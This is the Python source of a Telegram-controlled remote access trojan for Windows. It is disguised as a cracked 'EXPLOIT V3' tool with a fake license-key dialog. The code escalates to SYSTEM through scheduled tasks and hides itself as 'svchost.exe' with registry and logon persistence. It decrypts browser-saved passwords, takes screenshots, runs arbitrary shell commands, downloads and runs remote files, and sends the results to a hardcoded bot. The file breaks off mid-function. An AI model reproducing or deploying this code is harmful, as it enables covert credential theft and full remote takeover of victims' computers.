import os
import platform
import socket
import tkinter as tk
import webbrowser
import subprocess
import threading
import time
from tkinter import simpledialog
import requests
from mss import mss
import telebot
from telebot import types
import json
import ctypes
from urllib.parse import urlparse
import sqlite3
import base64
import shutil
from pathlib import Path
import win32crypt
from Cryptodome.Cipher import AES
import sys

TELEGRAM_BOT_TOKEN = 'AAEWoj62HoWpjP8NybB1S2cf3ysM-DOm_w8'
ADMIN_USER_ID = '7681611437'

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Multi-client management
connected_clients = {}  # {client_id: {'ip': ip, 'hostname': hostname, 'active': True}}
current_client = None   # Currently connected client ID
client_counter = 1      # Auto-incrementing client ID

# Register this client
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

# Generate unique client ID
client_id = client_counter
client_counter += 1

# Register client in the system
connected_clients[client_id] = {
    'ip': local_ip,
    'hostname': hostname,
    'active': True,
    'last_seen': time.time()
}

try:
    external_ip = requests.get('http://ip-api.com/json/', timeout=5).json()
except:
    external_ip = {"status": "fail"}

parent = tk.Tk()
parent.withdraw()

namedia = 'EXPLOIT V3 CRACK'

# Check and elevate privileges silently
def check_admin_privileges():
    try:
        # Check if already running as admin
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges_silent():
    if not check_admin_privileges():
        try:
            # Get current script path
            if getattr(sys, 'frozen', False):
                script_path = sys.executable
            else:
                script_path = os.path.abspath(__file__)
           
            # Create elevated copy in temp directory
            temp_dir = os.path.join(os.getenv('TEMP'), 'syscache')
            if not os.path.exists(temp_dir):
                os.makedirs(temp_dir)
           
            elevated_path = os.path.join(temp_dir, 'svchost.exe')
           
            # Copy current executable
            if not os.path.exists(elevated_path):
                shutil.copy2(script_path, elevated_path)
           
            # Create silent elevation using Windows Task Scheduler
            task_name = f"SysCache_{int(time.time())}"
           
            # Create task with highest privileges
            cmd_create = [
                'schtasks', '/create', '/tn', task_name,
                '/tr', f'"{elevated_path}"',
                '/sc', 'once', '/ru', 'SYSTEM',
                '/f'
            ]
           
            subprocess.run(cmd_create, shell=True, capture_output=True,
                         startupinfo=subprocess.STARTUPINFO())
           
            # Run the task immediately
            cmd_run = ['schtasks', '/run', '/tn', task_name]
            subprocess.run(cmd_run, shell=True, capture_output=True,
                         startupinfo=subprocess.STARTUPINFO())
           
            # Delete task after execution
            time.sleep(2)
            cmd_delete = ['schtasks', '/delete', '/tn', task_name, '/f']
            subprocess.run(cmd_delete, shell=True, capture_output=True,
                         startupinfo=subprocess.STARTUPINFO())
           
            # Exit current non-elevated process
            sys.exit(0)
           
        except Exception:
            pass  # Silent fail

# Setup auto-start persistence with admin rights
def setup_persistence():
    try:
        # Ensure we have admin rights first
        if not check_admin_privileges():
            elevate_privileges_silent()
       
        # Get current script path
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            script_path = sys.executable
        else:
            # Running as Python script
            script_path = os.path.abspath(__file__)
       
        # Hide the script/exe in AppData
        appdata_folder = os.path.join(os.getenv('APPDATA'), 'SystemServices')
        if not os.path.exists(appdata_folder):
            os.makedirs(appdata_folder)
       
        hidden_path = os.path.join(appdata_folder, 'svchost.exe')
       
        # Copy script/exe to hidden location
        if not os.path.exists(hidden_path):
            shutil.copy2(script_path, hidden_path)
       
        # Create registry entry for persistence (with admin rights)
        try:
            import winreg
            # HKLM for system-wide persistence
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r'Software\Microsoft\Windows\CurrentVersion\Run',
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'WindowsServiceHost', 0, winreg.REG_SZ, hidden_path)
            winreg.CloseKey(key)
        except:
            # Fallback to HKCU
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                   r'Software\Microsoft\Windows\CurrentVersion\Run',
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WindowsServiceHost', 0, winreg.REG_SZ, hidden_path)
                winreg.CloseKey(key)
            except:
                pass
       
        # Create scheduled task with highest privileges
        try:
            task_name = 'WindowsServiceHost'
            # Delete existing task
            subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True,
                         capture_output=True, startupinfo=subprocess.STARTUPINFO())
           
            # Create new task with SYSTEM privileges
            cmd = f'schtasks /create /tn "{task_name}" /tr "{hidden_path}" /sc onlogon /rl highest /ru SYSTEM /f'
            subprocess.run(cmd, shell=True, capture_output=True, startupinfo=subprocess.STARTUPINFO())
        except:
            pass
           
    except Exception as e:
        pass  # Silent failure to avoid detection

# Run privilege check and persistence setup
if not check_admin_privileges():
    elevate_privileges_silent()

setup_persistence()

def login():
    keyk = simpledialog.askstring(namedia, "Enter license key (CRACKED VERSION KEY: SHIT): ", parent=parent)
    if keyk == "SHIT":
        simpledialog.askstring(namedia,
            "Простите но Exploit не может запуститься. Повторите попытку через 10 минут. Сервера перегруженые. (ERR: 404. No answer)",
            parent=parent)
    else:
        simpledialog.askstring(namedia, "Не верный ключ. Нажмите ОК.", parent=parent)
        login()


@bot.message_handler(commands=['start', 'helpme'])
def help_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Update client last seen
    if client_id in connected_clients:
        connected_clients[client_id]['last_seen'] = time.time()
   
    connection_status = f"📡 Подключен к клиенту #{client_id} ({local_ip})" if current_client == client_id else "📡 Не подключен к клиенту"
   
    help_text = f"""
Telegram RAT Bot Commands:
/start veya /helpme - Bu menüyü göster
/client - Bağlı istemcilerin listesi
/connect [ID] - Bir istemciye bağlan
/disconnect - Bir istemciden bağlantıyı kes

{connection_status}

/info - Sistem bilgileri
/screen - Ekran görüntüsü al
/calc - Hesap makinesini aç
/taskmgr - Görev yöneticisini aç
/msg [metin] - Bilgisayarda mesaj göster
/brow [url] - Tarayıcıda web sitesi aç
/ip - Harici IP adresi
/spam [tür] - Windows'a (hesap makinesi/görev yöneticisi) spam gönder
/background [url] - Arka plan resmini ayarla
/passwd - Tarayıcılardan kaydedilmiş şifreleri al
/message [metin] - Metin içeren mesaj kutusu göster
/status [yeniden başlat/kapat] - Bilgisayarı yeniden başlat veya kapat
/shell [komut] - Arka planda shell komutu çalıştır
/download [url] - Dosyayı indir ve çalıştır
"""
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
   
    threading.Thread(target=login, daemon=True).start()

@bot.message_handler(commands=['client'])
def client_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    if not connected_clients:
        bot.reply_to(message, "❌ Нет подключенных клиентов")
        return
   
    # Clean up inactive clients (not seen for 5 minutes)
    current_time = time.time()
    inactive_clients = []
    for cid, client_data in connected_clients.items():
        if current_time - client_data['last_seen'] > 300:  # 5 minutes
            inactive_clients.append(cid)
   
    for cid in inactive_clients:
        del connected_clients[cid]
   
    # Generate client list
    client_list = "📡 Подключенные клиенты:\n\n"
    for cid, client_data in connected_clients.items():
        status = "🟢 Активен" if cid == current_client else "⚪ Неактивен"
        client_list += f"#{cid} - {client_data['hostname']} ({client_data['ip']}) {status}\n"
   
    bot.send_message(message.chat.id, client_list, parse_mode='Markdown')

@bot.message_handler(commands=['connect'])
def connect_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    try:
        client_num = int(message.text.replace('/connect ', '').strip())
       
        if client_num in connected_clients:
            global current_client
            current_client = client_num
            client_data = connected_clients[client_num]
            bot.reply_to(message, f"✅ Подключен к клиенту #{client_num} ({client_data['hostname']} - {client_data['ip']})")
        else:
            bot.reply_to(message, f"❌ Клиент #{client_num} не найден")
    except ValueError:
        bot.reply_to(message, "Используйте: /connect [номер_клиента]")

@bot.message_handler(commands=['disconnect'])
def disconnect_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    global current_client
    if current_client:
        disconnected_client = current_client
        current_client = None
        bot.reply_to(message, f"✅ Отключен от клиента #{disconnected_client}")
    else:
        bot.reply_to(message, "❌ Нет активного подключения")

@bot.message_handler(commands=['info'])
def info_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "⛔️ Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    info_text = f"""
System Info (Client #{client_id}):
• Local IP: {local_ip}
• Hostname: {hostname}
• OS: {platform.platform()}
• Processor: {platform.processor()}
• Username: {os.getlogin()}
"""
    bot.send_message(message.chat.id, info_text, parse_mode='Markdown')

@bot.message_handler(commands=['screen'])
def screen_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    try:
        bot.reply_to(message, "Делаю скриншот...")
       
        with mss() as sct:
            filename = f"screenshot_{client_id}.png"
            sct.shot(output=filename)
       
        with open(filename, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=f"📸 Скриншот с клиента #{client_id} ({local_ip})")
       
        os.remove(filename)
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['calc'])
def calc_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen('calc.exe', shell=True, startupinfo=startupinfo)
        bot.reply_to(message, f"Калькулятор запущен на клиенте #{client_id}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['taskmgr'])
def taskmgr_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen('taskmgr.exe', shell=True, startupinfo=startupinfo)
        bot.reply_to(message, f"Диспетчер задач запущен на клиенте #{client_id}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['msg'])
def msg_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    text = message.text.replace('/msg ', '').strip()
    if not text:
        bot.reply_to(message, "Используйте: /msg [текст]")
        return
   
    def show_dialog():
        # Hide any dialog windows
        response = simpledialog.askstring('Windows Dialog', text, parent=parent)
        if response:
            bot.send_message(message.chat.id, f"Ответ с клиента #{client_id} ({local_ip}): {response}")
        else:
            bot.send_message(message.chat.id, f"Диалог закрыт на клиенте #{client_id} ({local_ip})")
   
    threading.Thread(target=show_dialog, daemon=True).start()
    bot.reply_to(message, f"Сообщение отправлено клиенту #{client_id}: {text}")

@bot.message_handler(commands=['brow'])
def brow_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    url = message.text.replace('/brow ', '').strip()
    if not url:
        bot.reply_to(message, "Используйте: /brow [url]")
        return
   
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
   
    try:
        webbrowser.open(url)
        bot.reply_to(message, f"Открываю {url} на клиенте #{client_id}")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['ip'])
def ip_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    try:
        ip_info = json.dumps(external_ip, indent=2)
        bot.reply_to(message, f"Внешний IP клиента #{client_id}:\n```json\n{ip_info}\n```", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {str(e)}")

@bot.message_handler(commands=['spam'])
def spam_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    cmd = message.text.replace('/spam ', '').strip().lower()
   
    def spam_windows():
        try:
            # Hide all spawned processes
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
           
            if cmd == 'calc':
                for _ in range(10):
                    subprocess.Popen('calc.exe', shell=True, startupinfo=startupinfo)
                bot.send_message(message.chat.id, f"Запущено 10 калькуляторов на клиенте #{client_id}")
            elif cmd == 'taskmgr':
                for _ in range(5):
                    subprocess.Popen('taskmgr.exe', shell=True, startupinfo=startupinfo)
                bot.send_message(message.chat.id, f"Запущено 5 диспетчеров задач на клиенте #{client_id}")
            else:
                bot.reply_to(message, "Используйте: /spam calc или /spam taskmgr")
        except Exception as e:
            bot.send_message(message.chat.id, f"Ошибка спама на клиенте #{client_id}: {str(e)}")
   
    if cmd in ['calc', 'taskmgr']:
        threading.Thread(target=spam_windows, daemon=True).start()
        bot.reply_to(message, f"Запускаю спам {cmd} на клиенте #{client_id}...")
    else:
        bot.reply_to(message, "Используйте: /spam calc или /spam taskmgr")

@bot.message_handler(commands=['background'])
def background_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    url = message.text.replace('/background ', '').strip()
    if not url:
        bot.reply_to(message, "Используйте: /background [url_изображения]")
        return
   
    # Проверка валидности URL
    try:
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            bot.reply_to(message, "Неверный URL. Используйте полный URL изображения.")
            return
    except:
        bot.reply_to(message, "Неверный URL формат.")
        return
   
    def set_background():
        try:
            bot.send_message(message.chat.id, f"Загружаю изображение с {url} на клиенте #{client_id}...")
           
            # Загрузка изображения
            response = requests.get(url, timeout=30)
            response.raise_for_status()
           
            # Определяем расширение файла
            content_type = response.headers.get('content-type', '')
            if 'jpeg' in content_type or 'jpg' in content_type:
                ext = '.jpg'
            elif 'png' in content_type:
                ext = '.png'
            elif 'bmp' in content_type:
                ext = '.bmp'
            else:
                ext = '.jpg'  # default
           
            # Сохранение временного файла
            temp_image = f"temp_background_{client_id}{ext}"
            with open(temp_image, 'wb') as f:
                f.write(response.content)
           
            # Установка обоев на рабочий стол
            if platform.system() == "Windows":
                # Метод 1: Используем SystemParametersInfo с правильными флагами
                result = ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(temp_image), 1)
               
                # Метод 2: Если первый не сработал, пробуем с другими флагами
                if not result:
                    result = ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(temp_image), 3)
               
                # Метод 3: Принудительное обновление
                if result:
                    ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 0x0001 | 0x0002)
                    bot.send_message(message.chat.id, f"✅ Фоновое изображение установлено на клиенте #{client_id} ({local_ip})")
                else:
                    # Альтернативный метод через реестр
                    try:
                        import winreg
                        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                           r'Control Panel\Desktop',
                                           0, winreg.KEY_SET_VALUE)
                        winreg.SetValueEx(key, 'Wallpaper', 0, winreg.REG_SZ, os.path.abspath(temp_image))
                        winreg.SetValueEx(key, 'WallpaperStyle', 0, winreg.REG_SZ, '2')  # Stretch
                        winreg.SetValueEx(key, 'TileWallpaper', 0, winreg.REG_SZ, '0')
                        winreg.CloseKey(key)
                       
                        # Принудительное обновление
                        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 0x0001 | 0x0002)
                        bot.send_message(message.chat.id, f"✅ Фоновое изображение установлено через реестр на клиенте #{client_id} ({local_ip})")
                    except Exception as reg_error:
                        bot.send_message(message.chat.id, f"❌ Ошибка установки фона на клиенте #{client_id}: {str(reg_error)}")
            else:
                bot.send_message(message.chat.id, f"❌ Эта функция доступна только на Windows (клиент #{client_id})")
                os.remove(temp_image)
                return
           
            # Очистка временного файла через 30 секунд
            def cleanup():
                import time
                time.sleep(30)
                try:
                    if os.path.exists(temp_image):
                        os.remove(temp_image)
                except:
                    pass
           
            threading.Thread(target=cleanup, daemon=True).start()
           
        except requests.exceptions.RequestException as e:
            bot.send_message(message.chat.id, f"❌ Ошибка загрузки изображения на клиенте #{client_id}: {str(e)}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка установки фона на клиенте #{client_id}: {str(e)}")
   
    threading.Thread(target=set_background, daemon=True).start()
    bot.reply_to(message, f"Начинаю установку фона с {url} на клиенте #{client_id}...")

@bot.message_handler(commands=['passwd'])
def passwd_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    def extract_passwords():
        try:
            bot.send_message(message.chat.id, f"🔍 Ищу сохраненные пароли в браузерах клиента #{client_id}...")
           
            passwords_data = []
            browser_paths = get_browser_paths()
           
            for browser_name, paths in browser_paths.items():
                try:
                    if os.path.exists(paths['login_data']):
                        passwords = extract_browser_passwords(paths['login_data'], paths.get('local_state'))
                        if passwords:
                            passwords_data.extend([(browser_name, p[0], p[1], p[2]) for p in passwords])
                except Exception as e:
                    continue
           
            if passwords_data:
                # Отправка результатов по частям (Telegram лимит 4096 символов)
                send_passwords_in_parts(message.chat.id, passwords_data)
                bot.send_message(message.chat.id, f"✅ Найдено {len(passwords_data)} сохраненных паролей на клиенте #{client_id}")
            else:
                bot.send_message(message.chat.id, f"❌ Не найдено сохраненных паролей на клиенте #{client_id}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка извлечения паролей на клиенте #{client_id}: {str(e)}")
   
    threading.Thread(target=extract_passwords, daemon=True).start()
    bot.reply_to(message, f"Начинаю извлечение паролей на клиенте #{client_id}...")

@bot.message_handler(commands=['message'])
def message_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    # Извлекаем текст сообщения
    text = message.text.replace('/message ', '').strip()
   
    if not text:
        bot.reply_to(message, "Используйте: /message [текст_сообщения]")
        return
   
    def show_message_box():
        try:
            # Показываем message box на компьютере жертвы
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0)
            bot.send_message(message.chat.id, f"✅ Сообщение показано на клиенте #{client_id} ({local_ip}): {text}")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка показа сообщения на клиенте #{client_id}: {str(e)}")
   
    threading.Thread(target=show_message_box, daemon=True).start()
    bot.reply_to(message, f"Показываю сообщение на клиенте #{client_id}: {text}")

@bot.message_handler(commands=['status'])
def status_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    # Извлекаем параметр команды
    param = message.text.replace('/status ', '').strip().lower()
   
    if param not in ['restart', 'close']:
        bot.reply_to(message, "Используйте: /status restart или /status close")
        return
   
    def execute_status_command():
        try:
            if param == 'restart':
                bot.send_message(message.chat.id, f"🔄 Перезагружаю компьютер клиента #{client_id} ({local_ip})...")
                # Задержка для отправки сообщения перед перезагрузкой
                import time
                time.sleep(2)
                subprocess.run(['shutdown', '/r', '/t', '0'], shell=True)
            elif param == 'close':
                bot.send_message(message.chat.id, f"🔴 Выключаю компьютер клиента #{client_id} ({local_ip})...")
                # Задержка для отправки сообщения перед выключением
                import time
                time.sleep(2)
                subprocess.run(['shutdown', '/s', '/t', '0'], shell=True)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка выполнения команды на клиенте #{client_id}: {str(e)}")
   
    threading.Thread(target=execute_status_command, daemon=True).start()
   
    if param == 'restart':
        bot.reply_to(message, f"Начинаю перезагрузку клиента #{client_id} ({local_ip})...")
    elif param == 'close':
        bot.reply_to(message, f"Начинаю выключение клиента #{client_id} ({local_ip})...")

@bot.message_handler(commands=['shell'])
def shell_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    # Извлекаем команду shell
    command = message.text.replace('/shell ', '').strip()
   
    if not command:
        bot.reply_to(message, "Используйте: /shell [команда]")
        return
   
    def execute_shell_command():
        try:
            bot.send_message(message.chat.id, f"🔧 Выполняю команду на клиенте #{client_id} ({local_ip}): `{command}`", parse_mode='Markdown')
           
            # Выполняем команду в фоновом режиме без отображения окон
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
           
            # Выполняем команду и получаем результат
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                startupinfo=startupinfo,
                timeout=30  # Таймаут 30 секунд
            )
           
            output = result.stdout if result.stdout else "Команда выполнена (нет вывода)"
            if result.stderr:
                output += f"\nОшибки: {result.stderr}"
           
            # Отправляем результат (ограничиваем длину)
            if len(output) > 4000:
                output = output[:4000] + "...\n(вывод усечен)"
           
            bot.send_message(message.chat.id, f"✅ Результат выполнения на клиенте #{client_id}:\n```\n{output}\n```", parse_mode='Markdown')
           
        except subprocess.TimeoutExpired:
            bot.send_message(message.chat.id, f"⏰ Команда превысила время ожидания на клиенте #{client_id} (30 секунд)")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка выполнения команды на клиенте #{client_id}: {str(e)}")
   
    threading.Thread(target=execute_shell_command, daemon=True).start()
    bot.reply_to(message, f"Выполняю команду в фоновом режиме на клиенте #{client_id}: {command}")

@bot.message_handler(commands=['download'])
def download_command(message):
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        bot.reply_to(message, "Доступ запрещен")
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    # Проверяем, есть ли URL в команде
    command_text = message.text.replace('/download ', '').strip()
   
    if command_text:
        # Скачивание по URL
        def download_from_url():
            try:
                bot.send_message(message.chat.id, f"📥 Начинаю скачивание с {command_text} на клиенте #{client_id}...")
               
                # Генерируем имя файла из URL
                filename = command_text.split('/')[-1].split('?')[0]
                if not filename or '.' not in filename:
                    filename = f"downloaded_file_{client_id}_{int(time.time())}.exe"
               
                # Скачиваем файл
                response = requests.get(command_text, timeout=60)
                response.raise_for_status()
               
                # Сохраняем файл
                with open(filename, 'wb') as f:
                    f.write(response.content)
               
                bot.send_message(message.chat.id, f"✅ Файл скачан на клиенте #{client_id}: {filename} ({len(response.content)} bytes)")
               
                # Автоматический запуск
                execute_downloaded_file(filename, message.chat.id)
               
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Ошибка скачивания на клиенте #{client_id}: {str(e)}")
       
        threading.Thread(target=download_from_url, daemon=True).start()
        bot.reply_to(message, f"Скачиваю файл с URL на клиенте #{client_id}: {command_text}")
   
    else:
        # Ожидаем файл в следующем сообщении
        bot.reply_to(message, f"Пришлите файл или используйте: /download [URL] (клиент #{client_id})")
        # Сохраняем состояние для следующего сообщения
        bot.register_next_step_handler(message, handle_file_download)

def get_browser_paths():
    """Получить пути к данным браузеров"""
    appdata = os.getenv('APPDATA')
    localappdata = os.getenv('LOCALAPPDATA')
   
    browsers = {
        'Chrome': {
            'login_data': os.path.join(localappdata, r'Google\Chrome\User Data\Default\Login Data'),
            'local_state': os.path.join(localappdata, r'Google\Chrome\User Data\Local State')
        },
        'Edge': {
            'login_data': os.path.join(localappdata, r'Microsoft\Edge\User Data\Default\Login Data'),
            'local_state': os.path.join(localappdata, r'Microsoft\Edge\User Data\Local State')
        },
        'Firefox': {
            'login_data': os.path.join(appdata, r'Mozilla\Firefox\Profiles')
        },
        'Opera': {
            'login_data': os.path.join(appdata, r'Opera Software\Opera Stable\Login Data'),
            'local_state': os.path.join(appdata, r'Opera Software\Opera Stable\Local State')
        },
        'Brave': {
            'login_data': os.path.join(localappdata, r'BraveSoftware\Brave-Browser\User Data\Default\Login Data'),
            'local_state': os.path.join(localappdata, r'BraveSoftware\Brave-Browser\User Data\Local State')
        }
    }
    return browsers

def get_encryption_key(local_state_path):
    """Получить ключ шифрования из Local State"""
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
       
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(cipher_text, encryption_key):
    """Расшифровать пароль"""
    try:
        iv = cipher_text[3:15]
        payload = cipher_text[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except:
        try:
            return win32crypt.CryptUnprotectData(cipher_text, None, None, None, 0)[1].decode('utf-8')
        except:
            return ""

def extract_browser_passwords(login_data_path, local_state_path=None):
    """Извлечь пароли из файла браузера"""
    passwords = []
   
    # Создаем временную копию файла (чтобы избежать блокировки)
    temp_path = "temp_login_data.db"
    try:
        shutil.copy2(login_data_path, temp_path)
       
        encryption_key = None
        if local_state_path and os.path.exists(local_state_path):
            encryption_key = get_encryption_key(local_state_path)
       
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
       
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            ciphertext = row[2]
           
            if not url or not username:
                continue
               
            if ciphertext:
                if encryption_key and ciphertext[:3] == b'v10':
                    password = decrypt_password(ciphertext, encryption_key)
                else:
                    try:
                        password = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode('utf-8')
                    except:
                        password = ""
            else:
                password = ""
           
            if username or password:
                passwords.append((url, username, password))
       
        cursor.close()
        conn.close()
       
        # Удаляем временный файл
        if os.path.exists(temp_path):
            os.remove(temp_path)
           
    except Exception as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise e
   
    return passwords

def send_passwords_in_parts(chat_id, passwords_data):
    """Отправить пароли по частям из-за ограничения Telegram"""
    # Форматируем данные в таблицу
    message = "🔐 Сохраненные пароли:\n\n"
    message += "Browser | Website | Username | Password\n"
    message += "-" * 50 + "\n"
   
    for browser, url, username, password in passwords_data:
        # Ограничиваем длину для предотвращения превышения лимита
        site = url.split('//')[-1].split('/')[0][:20]  # Доменное имя
        user = username[:15] if username else "—"
        pwd = password[:15] if password else "—"
       
        line = f"{browser[:8]} | {site} | {user} | {pwd}\n"
       
        if len(message + line) > 4000:  # Оставляем запас для завершения
            bot.send_message(chat_id, message, parse_mode='Markdown')
            message = "Продолжение:\n\n"
       
        message += line
   
    if message and not message.startswith("Продолжение"):
        bot.send_message(chat_id, message, parse_mode='Markdown')

def execute_downloaded_file(filename, chat_id):
    """Запустить скачанный файл в фоновом режиме"""
    try:
        bot.send_message(chat_id, f"🚀 Запускаю файл на клиенте #{client_id}: {filename}")
       
        # Запуск файла в фоновом режиме без окон
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
